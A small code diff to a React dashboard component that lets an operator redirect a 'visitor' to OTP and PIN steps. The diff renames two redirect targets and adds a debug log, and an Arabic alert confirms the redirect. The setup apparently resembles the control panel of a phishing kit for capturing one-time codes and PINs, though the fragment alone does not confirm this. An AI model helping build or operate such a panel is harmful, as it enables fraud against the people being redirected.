@@ -68,13 +68,13 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           break
         case "otp":
           updates = { 
-            redirectPage: "veri" as any,
+            redirectPage: "otp" as any,
             currentStep: "_t2" as any 
           }
           break
         case "pin":
           updates = { 
-            redirectPage: "confi" as any,
+            redirectPage: "pin" as any,
             currentStep: "_t3" as any 
           }
           break
@@ -92,6 +92,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       }
       
       if (Object.keys(updates).length > 0) {
+        console.log('[Dashboard] Sending redirect:', destination, updates)
         await updateApplication(visitor.id, updates)
         alert(`تم توجيه الزائر بنجاح!`)
       }
